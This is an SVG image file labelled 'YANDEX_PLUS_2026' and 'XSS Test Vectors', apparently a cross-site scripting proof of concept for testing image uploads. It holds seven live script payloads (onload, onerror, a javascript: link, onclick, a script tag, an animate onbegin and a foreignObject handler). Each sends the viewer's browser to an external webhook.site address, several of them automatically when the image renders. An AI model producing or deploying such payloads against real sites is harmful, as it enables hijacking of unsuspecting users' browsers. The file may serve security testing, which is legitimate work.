<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" onload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'">
  
  <!-- Фон -->
  <rect width="100%" height="100%" fill="#cc0000"/>
  
  <!-- Текст -->
  <text x="50%" y="45%" font-size="80" fill="white" font-family="Arial" text-anchor="middle" dominant-baseline="central" font-weight="bold">
    YANDEX_PLUS_2026
  </text>
  
  <text x="50%" y="55%" font-size="30" fill="white" font-family="Arial" text-anchor="middle" dominant-baseline="central" opacity="0.7">
    XSS Test Vectors
  </text>
  
  <!-- Вектор 1: onload на изображении -->
  <image href="x" onerror="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'" width="0" height="0"/>
  
  <!-- Вектор 2: Ссылка с javascript -->
  <a href="javascript:window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'">
    <rect width="100%" height="100%" fill="transparent"/>
  </a>
  
  <!-- Вектор 3: Ссылка с onclick -->
  <a href="#" onclick="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'">
    <rect width="100%" height="100%" fill="transparent" opacity="0.1"/>
  </a>
  
  <!-- Вектор 4: script -->
  <script>
    window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'
  </script>
  
  <!-- Вектор 5: Анимация с onbegin -->
  <circle cx="50%" cy="75%" r="10" fill="yellow">
    <animate attributeName="r" values="10;30;10" dur="2s" repeatCount="indefinite"
             onbegin="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
  </circle>
  
  <!-- Вектор 6: onfocus autofocus -->
  <text x="50%" y="65%" font-size="20" fill="white" font-family="Arial" text-anchor="middle" dominant-baseline="central"
        onfocus="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'" tabindex="0">
    Click to test XSS
  </text>
  
  <!-- Вектор 7: foreignObject -->
  <foreignObject width="100%" height="100%">
    <div xmlns="http://www.w3.org/1999/xhtml" 
         onclick="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'">
      <img src="x" onerror="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
    </div>
  </foreignObject>
  
</svg>
